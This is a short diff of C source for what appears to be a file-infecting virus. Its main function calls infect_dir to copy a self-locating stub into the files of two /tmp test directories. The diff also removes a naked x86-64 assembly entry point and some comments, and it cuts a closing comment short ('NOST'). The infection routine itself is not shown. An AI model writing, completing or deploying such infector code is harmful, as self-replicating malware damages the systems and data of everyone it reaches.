@@ -27,13 +27,9 @@ void _start();
 #if CREATE_STUB
 
 int main(void) {
-	// FIXME: should get the stub from the executable itself,
-	//        we will need to add some variables which locate the placeholders
-	//        instead of searching through the text
 	size_t offset = (uintptr_t)&placeholders - (uintptr_t)&_start;
 	infect_dir("/tmp/test", (void*)&_start, placeholders.stub_len, offset);
 	infect_dir("/tmp/test2", (void*)&_start, placeholders.stub_len, offset);
-	write(-1, (void*)&offset, 0); // TODO: temporary just to make "placeholders" stay
 	LOG("done\n");
 	LOG("placeholder offset: %zu\n", offset);
 	return (0);
@@ -115,24 +111,6 @@ void _start() {
 }
 
 #else
-#error just use libc if you're not going to create a stub
-
-__attribute__((section("._start")))
-__attribute__((naked))
-void _start() {
-	// callee-saved RBX, RSP, RBP, and R12–R15
-	asm volatile(
-		"movq %%rdx, %%rbx\n" // save rtld_fini
-		"movq %%rsp, %%rdi\n" // pass address of rsp to my_start
-		"subq $8, %%rsp\n" // reserve space for load_base
-		"movq %%rsp, %%rsi\n" // pass address to load_base
-		"call my_start\n"
-		"xorq %%rdi, %%rdi\n"
-		"movq $60, %%rax\n"
-		"syscall\n"
-		:
-	);
-}
-
+#error just use libc if youre not going to create a stub
 #endif // CREATE_STUB
-#endif // NOSTD
+#endif // NOST
